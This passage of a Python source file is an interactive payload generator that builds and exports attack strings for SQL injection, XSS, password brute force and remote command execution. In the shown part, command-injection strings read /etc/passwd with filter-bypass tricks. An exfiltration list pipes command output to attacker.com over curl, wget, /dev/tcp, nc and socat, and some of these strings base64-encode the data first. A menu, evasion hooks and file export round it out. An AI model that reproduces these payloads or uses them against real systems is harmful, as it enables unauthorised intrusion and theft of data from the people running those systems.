            f"c\\at /etc/passwd",
            f"echo${IFS}'{command}'|$0",
            f"cat </etc/passwd",
            f"a=\"c\";b=\"at\";c=\" /etc/\";d=\"passwd\";$a$b$c$d"
        ]
        
        # Data exfiltration techniques
        exfil_rce = [
            f"{command} | curl -d @- http://attacker.com",
            f"{command} | wget --post-data=@- http://attacker.com",
            f"{command} > /dev/tcp/attacker.com/4444",
            f"bash -c '{command} >/dev/tcp/attacker.com/4444'",
            f"{command} | base64 | curl -d @- http://attacker.com",
            f"xxd -p /etc/passwd | tr -d '\n' | curl -d @- http://attacker.com",
            f"{command} | openssl enc -base64 | curl -d @- http://attacker.com",
            f"{command} | nc attacker.com 4444",
            f"{command} | socat - TCP:attacker.com:4444",
            f"{command} | tee /dev/tcp/attacker.com/4444"
        ]
        
        # Combine all payloads based on OS
        all_payloads = basic_rce[:]
        
        os_type_lower = os_type.lower()
        if os_type_lower in os_payloads:
            all_payloads.extend(os_payloads[os_type_lower])
        elif os_type_lower == 'all':
            for os_specific_payloads in os_payloads.values():
                all_payloads.extend(os_specific_payloads)
        
        # Add advanced payloads for comprehensive testing
        all_payloads.extend(advanced_rce)
        all_payloads.extend(filter_bypass_rce)
        all_payloads.extend(exfil_rce)
        
        # Apply evasion techniques
        evaded_payloads = self._apply_evasion_techniques(all_payloads, 'rce')
        
        self.log(f"Generated {len(evaded_payloads)} RCE payloads")
        self.payload_storage['rce'] = evaded_payloads
        
        return evaded_payloads
    
    def export_payloads(self, payload_type: str = None, format: str = 'txt', output_file: str = None) -> None:
        """
        Export generated payloads to file in various formats
        """
        if payload_type is None or payload_type not in self.payload_types:
            print(f"Available payload types: {', '.join(self.payload_types)}")
            payload_type = input("Enter payload type to export: ")
            
        if payload_type not in self.payload_types:
            self.log(f"Error: Invalid payload type '{payload_type}'")
            return
            
        if not self.payload_storage[payload_type]:
            self.log(f"Error: No '{payload_type}' payloads generated yet")
            return
            
        payloads = self.payload_storage[payload_type]
        
        if output_file is None:
            output_file = f"{payload_type}_payloads_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format}"
            
        try:
            if format.lower() == 'txt':
                with open(output_file, 'w') as f:
                    for payload in payloads:
                        f.write(f"{payload}\n")
            elif format.lower() == 'json':
                with open(output_file, 'w') as f:
                    json.dump(payloads, f, indent=2)
            elif format.lower() == 'csv':
                with open(output_file, 'w') as f:
                    f.write("payload,length,entropy\n")
                    for payload in payloads:
                        f.write(f"\"{payload}\",{len(payload)},{self._calculate_entropy(payload)}\n")
            else:
                self.log(f"Error: Unsupported format '{format}'")
                return
                
            self.log(f"Successfully exported {len(payloads)} {payload_type} payloads to {output_file}")
        except Exception as e:
            self.log(f"Error exporting payloads: {e}")
    
    def display_payloads(self, payload_type: str = None, limit: int = 10) -> None:
        """
        Display generated payloads in a formatted table
        """
        if payload_type is None or payload_type not in self.payload_types:
            print(f"Available payload types: {', '.join(self.payload_types)}")
            payload_type = input("Enter payload type to display: ")
            
        if payload_type not in self.payload_types:
            self.log(f"Error: Invalid payload type '{payload_type}'")
            return
            
        if not self.payload_storage[payload_type]:
            self.log(f"Error: No '{payload_type}' payloads generated yet")
            return
            
        payloads = self.payload_storage[payload_type]
        
        table = PrettyTable()
        table.field_names = ["#", "Payload", "Length", "Entropy"]
        
        for i, payload in enumerate(payloads[:limit], 1):
            table.add_row([
                i, 
                payload[:50] + "..." if len(payload) > 50 else payload,
                len(payload),
                round(self._calculate_entropy(payload), 2)
            ])
            
        print(f"\n=== {payload_type.upper()} Payloads ===")
        print(table)
        print(f"Showing {min(limit, len(payloads))} of {len(payloads)} payloads")
    
    def run_interactive(self) -> None:
        """
        Run the payload generator in interactive mode
        """
        print("\n" + "="*60)
        print("  Enhanced Secure Payload Generation Framework")
        print("  Developed by Anubhav Mohandas")
        print("="*60 + "\n")
        
        while True:
            print("\nAvailable operations:")
            print("1. Generate Password Bruteforce Payloads")
            print("2. Generate SQL Injection Payloads")
            print("3. Generate XSS Payloads")
            print("4. Generate RCE Payloads")
            print("5. Display Generated Payloads")
            print("6. Export Payloads to File")
            print("7. Configure Settings")
            print("8. Exit")
            
            choice = input("\nEnter your choice (1-8): ")
            
            if choice == '1':
                self.generate_enhanced_password_payloads()
            elif choice == '2':
                self.generate_enhanced_sql_injection()
            elif choice == '3':
                self.generate_enhanced_xss_payloads()
            elif choice == '4':
                self.generate_enhanced_rce_payloads()
            elif choice == '5':
                self.display_payloads()
            elif choice == '6':
                payload_type = input("Enter payload type to export: ")
                format = input("Enter export format (txt, json, csv): ")
                self.export_payloads(payload_type, format)
            elif choice == '7':
                self._configure_settings()
            elif choice == '8':
                print("Exiting. Thank you for using the Enhanced Payload Generator!")
                break
            else:
                print("Invalid choice. Please try again.")
    
    def _configure_settings(self) -> None:
        """
        Configure generator settings
        """
        print("\nCurrent Settings:")
        for key, value in self.config.items():
            print(f"{key}: {value}")
            
        print("\nEnter setting to change (or 'back' to return):")
        setting = input("> ")
        
        if setting.lower() == 'back':
            return
            
        if setting in self.config:
            new_value = input(f"Enter new value for {setting}: ")
            
            # Convert to appropriate type
            if isinstance(self.config[setting], bool):
                self.config[setting] = new_value.lower() in ['true', 'yes', '1']
            elif isinstance(self.config[setting], int):
                try:
                    self.config[setting] = int(new_value)
                except ValueError:
                    print("Invalid integer value.")
            elif isinstance(self.config[setting], float):
                try:
                    self.config[setting] = float(new_value)
                except ValueError:
                    print("Invalid float value.")
            else:
                self.config[setting] = new_value
                
            print(f"Setting {setting} updated to {self.config[setting]}")
        else:
            print(f"Setting {setting} not found.")

# Main execution
if __name__ == "__main__":
    generator = EnhancedPayloadGenerator()
    generator.run_interactive()
